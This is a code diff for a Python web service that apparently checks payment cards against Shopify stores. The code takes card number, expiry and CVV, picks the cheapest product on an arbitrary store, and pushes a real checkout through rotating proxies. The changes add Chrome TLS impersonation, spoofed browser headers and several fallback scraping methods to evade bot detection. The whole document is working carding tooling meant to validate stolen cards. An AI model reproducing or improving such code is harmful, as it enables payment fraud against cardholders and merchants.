@@ -1,5 +1,5 @@
 import asyncio
-import aiohttp
+from curl_cffi.requests import AsyncSession
 import json
 import re
 import random
@@ -104,17 +104,29 @@ class Utils:
 def parse_proxy(proxy_str):
     if not proxy_str:
         return None
+    proxy_str = str(proxy_str).strip()
+    if not proxy_str:
+        return None
     
+    if proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
+        return proxy_str
+    
+    if '@' in proxy_str:
+        return f"http://{proxy_str}"
+        
     parts = proxy_str.split(':')
-    
     if len(parts) == 2:
         ip, port = parts
         return f"http://{ip}:{port}"
     elif len(parts) == 4:
-        ip, port, user, password = parts
+        part0 = parts[0]
+        if part0.replace('.', '').isdigit() or '.' in part0:
+            ip, port, user, password = parts
+        else:
+            user, password, ip, port = parts
         return f"http://{user}:{password}@{ip}:{port}"
-    else:
-        return None
+    
+    return f"http://{proxy_str}"
 
 def is_captcha_required(response_text):
     if not response_text:
@@ -146,7 +158,7 @@ async def make_graphql_request_with_captcha_handling(
     for attempt in range(max_retries + 1):
         try:
             response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
-            response_text = await response.text()
+            response_text = response.text
             return response, response_text, False
             
         except Exception as e:
@@ -161,59 +173,178 @@ async def fetch_products(domain, proxy_str=None):
         if not domain.startswith('http'):
             domain = "https://" + domain
         
-        connector = aiohttp.TCPConnector(ssl=False)
-        timeout = aiohttp.ClientTimeout(total=10)
-        
+        domain = domain.rstrip('/')
         proxy = parse_proxy(proxy_str) if proxy_str else None
         
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
-                if resp.status != 200:
-                    return False, f"<b>Site Error! Status: {resp.status}</b>"
-                text = await resp.text()
-                if "shopify" not in text.lower():
-                    return False, "<b>Not Shopify!</b>"
-
-                result = (await resp.json())['products']
-                if not result:
-                    return False, "<b>No Products!</b>"
-
-        min_price = float('inf')
-        min_product = None
-
-        for product in result:
-            if not product.get('variants'):
-                continue
-            
-            for variant in product['variants']:
-                if not variant.get('available', True):
-                    continue
-                
-                try:
-                    price = variant.get('price', '0')
-                    if isinstance(price, str):
-                        price = float(price.replace(',', ''))
-                    else:
-                        price = float(price)
-
-                    if price < min_price:
-                        min_price = price
-                        min_product = {
-                            'site': domain,
-                            'price': f"{price:.2f}",
-                            'variant_id': str(variant['id']),
-                            'link': f"{domain}/products/{product['handle']}"
-                        }
-                except (ValueError, TypeError, AttributeError):
-                    continue
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Referer': f"{domain}/",
+            'Sec-Ch-Ua': '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin'
+        }
         
-        if isinstance(min_product, dict) and min_product.get('variant_id'):
-            return min_product
-        else:
-            return False, "<b>No Valid Products</b>"
+        endpoints = [
+            f"{domain}/products.json?limit=250",
+            f"{domain}/products.json",
+            f"{domain}/collections/all/products.json?limit=250"
+        ]
+        
+        json_data = None
+        last_status = 429
+        
+        async with AsyncSession(impersonate="chrome120") as session:
+            # Method 1: Standard Shopify products.json endpoints
+            for endpoint in endpoints:
+                try:
+                    resp = await session.get(endpoint, headers=headers, proxy=proxy, timeout=8)
+                    last_status = resp.status_code
+                    if resp.status_code == 200:
+                        try:
+                            data = resp.json()
+                            if data and 'products' in data and data['products']:
+                                json_data = data
+                                break
+                        except Exception:
+                            pass
+                except Exception:
+                    continue
 
-    except aiohttp.ClientError as e:
-        return False, f"<b>Proxy Error: {str(e)}</b>"
+            if json_data and 'products' in json_data and json_data['products']:
+                products = json_data['products']
+                min_price = float('inf')
+                min_product = None
+
+                for product in products:
+                    if not product.get('variants'):
+                        continue
+                    
+                    for variant in product['variants']:
+                        if not variant.get('available', True):
+                            continue
+                        
+                        try:
+                            price = variant.get('price', '0')
+                            if isinstance(price, str):
+                                price = float(price.replace(',', ''))
+                            else:
+                                price = float(price)
+
+                            if price > 0 and price < min_price:
+                                min_price = price
+                                min_product = {
+                                    'site': domain,
+                                    'price': f"{price:.2f}",
+                                    'variant_id': str(variant['id']),
+                                    'link': f"{domain}/products/{product.get('handle', '')}"
+                                }
+                        except (ValueError, TypeError, AttributeError):
+                            continue
+                
+                if isinstance(min_product, dict) and min_product.get('variant_id'):
+                    return min_product
+
+            # Method 2: Sitemap XML fallback (/sitemap_products_1.xml)
+            try:
+                resp = await session.get(f"{domain}/sitemap_products_1.xml", headers=headers, proxy=proxy, timeout=8)
+                if resp.status_code == 200:
+                    sitemap_text = resp.text
+                    handles = re.findall(r'/products/([a-zA-Z0-9_-]+)', sitemap_text)
+                    unique_handles = list(dict.fromkeys(handles))[:10]
+                    for handle in unique_handles:
+                        try:
+                            p_resp = await session.get(f"{domain}/products/{handle}.js", headers=headers, proxy=proxy, timeout=5)
+                            if p_resp.status_code == 200:
+                                pdata = p_resp.json()
+                                variants = pdata.get('variants', [])
+                                for v in variants:
+                                    if v.get('available', True) and v.get('id'):
+                                        price_val = v.get('price', 100)
+                                        if isinstance(price_val, (int, float)):
+                                            price_str = f"{(price_val / 100):.2f}" if price_val > 500 else f"{float(price_val):.2f}"
+                                        else:
+                                            price_str = str(price_val)
+                                        return {
+                                            'site': domain,
+                                            'price': price_str,
+                                            'variant_id': str(v['id']),
+                                            'link': f"{domain}/products/{handle}"
+                                        }
+                        except Exception:
+                            continue
+            except Exception:
+                pass
+
+            # Method 3: Predictive Search fallback (/search/suggest.json)
+            try:
+                search_url = f"{domain}/search/suggest.json?q=a&resources[type]=product&resources[limit]=10"
+                resp = await session.get(search_url, headers=headers, proxy=proxy, timeout=8)
+                if resp.status_code == 200:
+                    sdata = resp.json()
+                    res_products = sdata.get('resources', {}).get('results', {}).get('products', []) if isinstance(sdata, dict) else []
+                    for p in res_products:
+                        handle = p.get('handle')
+                        if not handle:
+                            continue
+                        try:
+                            p_resp = await session.get(f"{domain}/products/{handle}.js", headers=headers, proxy=proxy, timeout=5)
+                            if p_resp.status_code == 200:
+                                pdata = p_resp.json()
+                                variants = pdata.get('variants', [])
+                                for v in variants:
+                                    if v.get('available', True) and v.get('id'):
+                                        price_val = v.get('price', 100)
+                                        if isinstance(price_val, (int, float)):
+                                            price_str = f"{(price_val / 100):.2f}" if price_val > 500 else f"{float(price_val):.2f}"
+                                        else:
+                                            price_str = str(price_val)
+                                        return {
+                                            'site': domain,
+                                            'price': price_str,
+                                            'variant_id': str(v['id']),
+                                            'link': f"{domain}/products/{handle}"
+                                        }
+                        except Exception:
+                            continue
+            except Exception:
+                pass
+
+            # Method 4: Comprehensive HTML Scraping (homepage, /products, /collections/all)
+            html_urls = [f"{domain}", f"{domain}/products", f"{domain}/collections/all"]
+            for hurl in html_urls:
+                try:
+                    resp = await session.get(hurl, headers=headers, proxy=proxy, timeout=8)
+                    if resp.status_code == 200:
+                        html = resp.text
+                        
+                        patterns = [
+                            r'variant[_-]?id["\']?\s*[:=]\s*["\']?(\d{10,16})',
+                            r'["\']variants["\']\s*:\s*\[\s*\{\s*["\']id["\']\s*:\s*(\d{10,16})',
+                            r'["\']?variantId["\']?\s*[:=]\s*["\']?(\d{10,16})',
+                            r'data-variant-id=["\']?(\d{10,16})',
+                            r'/products/[^"\'\?\s]+\?variant=(\d{10,16})',
+                            r'value=["\']?(\d{12,15})["\']'
+                        ]
+                        
+                        for pat in patterns:
+                            variants = re.findall(pat, html)
+                            if variants:
+                                return {
+                                    'site': domain,
+                                    'price': "1.00",
+                                    'variant_id': str(variants[0]),
+                                    'link': domain
+                                }
+                except Exception:
+                    continue
+
+            return False, f"<b>No products found on store</b>" if last_status == 200 else f"<b>Site Error! Status: {last_status}</b>"
+
     except Exception as e:
         return False, f"error: {str(e)}"
 
@@ -294,10 +425,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, info[1], gateway, total_price, currency
             variant_id = info['variant_id']
 
-        connector = aiohttp.TCPConnector(ssl=False)
-        timeout = aiohttp.ClientTimeout(total=30)
-        
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        async with AsyncSession(impersonate="chrome120") as session:
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
@@ -307,19 +435,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Accept': 'application/json, text/javascript'
             }
-            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
+            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy, timeout=30)
             
-            if cart_resp.status != 200:
+            if cart_resp.status_code != 200:
                 cart_headers_alt = {
                     **headers,
                     'Content-Type': 'application/json',
                     'Accept': 'application/json'
                 }
                 cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
-                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
+                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy, timeout=30)
             
-            if cart_resp.status != 200:
-                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency
+            if cart_resp.status_code != 200:
+                return False, f"Cart failed with status {cart_resp.status_code}", gateway, total_price, currency
 
             checkout_headers = {
                 **headers,
@@ -329,7 +457,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1'
             }
-            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
+            checkout = f"{url}/checkout?skip_shop_pay=true"
+            response = await session.get(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=30)
             checkout_url = str(response.url)
 
             attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
@@ -337,20 +466,64 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
             
-            text = await response.text()
-            if not sst:
-                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
-                if not sst:
-                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
-                if not sst:
-                    sst = extract_between(text, '"serializedSessionToken":"', '"')
-                if not sst:
-                    sst = extract_between(text, 'data-session-token="', '"')
-                if not sst:
-                    sst = extract_between(text, '"sessionToken":"', '"')
+            # Extract session token (sst) strictly from HTML meta tags or JSON payload
+            text = response.text
+            from html import unescape
             
-            if 'login' in checkout_url.lower():
+            def parse_sst_from_html(html_str, c_url=""):
+                if not html_str:
+                    return None
+                
+                # 1. Meta tag format: <meta name="serialized-sessionToken" content="..."/>
+                meta_match = re.search(r'<meta[^>]+name="serialized-sessionToken"[^>]+content="([^"]+)"', html_str, re.IGNORECASE)
+                if not meta_match:
+                    meta_match = re.search(r'<meta[^>]+content="([^"]+)"[^>]+name="serialized-sessionToken"', html_str, re.IGNORECASE)
+                if not meta_match:
+                    meta_match = re.search(r'<meta\s+name="serialized-session.*?token"\s+content="([^"]+)"', html_str, re.IGNORECASE)
+                
+                if meta_match:
+                    raw_val = unescape(meta_match.group(1)).strip()
+                    if raw_val.startswith('"') and raw_val.endswith('"'):
+                        raw_val = raw_val[1:-1]
+                    elif raw_val.startswith("'") and raw_val.endswith("'"):
+                        raw_val = raw_val[1:-1]
+                    token = raw_val.strip()
+                    if len(token) > 20:
+                        return token
+                
+                # 2. JSON property format: "sessionToken":"..." or "serializedSessionToken":"..."
+                json_match = re.search(r'["\'](?:sessionToken|serializedSessionToken)["\']\s*:\s*["\']([^"\']+)["\']', html_str)
+                if json_match:
+                    raw_val = unescape(json_match.group(1)).strip()
+                    if raw_val.startswith('"') and raw_val.endswith('"'):
+                        raw_val = raw_val[1:-1]
+                    token = raw_val.strip()
+                    if len(token) > 20:
+                        return token
+                return None
+
+            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
+            if not sst:
+                sst = parse_sst_from_html(text, checkout_url)
+
+            # Fallback permalink checkout if session token was not found via cart add
+            if not sst:
+                permalink_url = f"{url}/cart/{variant_id}:1"
+                response = await session.get(url=permalink_url, allow_redirects=True, headers=checkout_headers, proxy=proxy, timeout=30)
+                checkout_url = str(response.url)
+                attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+                attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
+                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
+                text = response.text
+                if not sst:
+                    sst = parse_sst_from_html(text, checkout_url)
+            
+            # Check if store requires customer login/authentication before checkout
+            if 'login' in checkout_url.lower() or 'authentication' in checkout_url.lower() or '/account' in checkout_url.lower():
                 return False, "Site requires login!", gateway, total_price, currency
+
+            if not sst:
+                return False, "Failed to get session token", gateway, total_price, currency
 
             queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
             stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
@@ -459,7 +632,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 }
                             },
                             'quantity': {'items': {'value': 1}},
-                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
+                            'expectedTotalPrice': {'any': True},
                             'lineComponentsSource': None,
                             'lineComponents': []
                         }]
@@ -696,9 +869,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if ident_sig:
                 vault_headers['shopify-identification-signature'] = ident_sig
             
-            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
+            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=30)
             try:
-                token_data = await response.json()
+                token_data = response.json()
                 token = token_data.get('id')
                 if not token:
                     return False, 'Unable to get payment token', gateway, total_price, currency
@@ -756,9 +929,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 }
                             },
                             'quantity': {'items': {'value': 1}},
-                            'expectedTotalPrice': {
-                                'value': {'amount': subtotal, 'currencyCode': currency}
-                            },
+                            'expectedTotalPrice': {'any': True},
                             'lineComponentsSource': None,
                             'lineComponents': []
                         }]
@@ -997,7 +1168,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, f"Unknown Result", gateway, total_price, currency
 
     except Exception as e:
-        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
+        err_msg = str(e)
+        if 'curl: (7' in err_msg or 'Connection refused' in err_msg or 'Could not resolve' in err_msg:
+            return False, "Proxy Error: Connection Failed", gateway, total_price, currency
+        elif 'curl: (28' in err_msg or 'Timed out' in err_msg or 'Timeout' in err_msg:
+            return False, "Proxy Error: Connection Timeout", gateway, total_price, currency
+        return False, f"Error Processing Card: {err_msg}", gateway, total_price, currency
 
 def parse_cc_string(cc_string):
     parts = cc_string.split('|')
@@ -1078,4 +1254,9 @@ async def shopify_checker(
         })
 
 if __name__ == "__main__":
-    uvicorn.run(app, host='0.0.0.0', port=8000)
+    import os
+    port = int(os.getenv("PORT", 8000))
+    if os.name == 'nt':
+        uvicorn.run(app, host='0.0.0.0', port=port)
+    else:
+        uvicorn.run("main:app", host='0.0.0.0', port=port, workers=4)
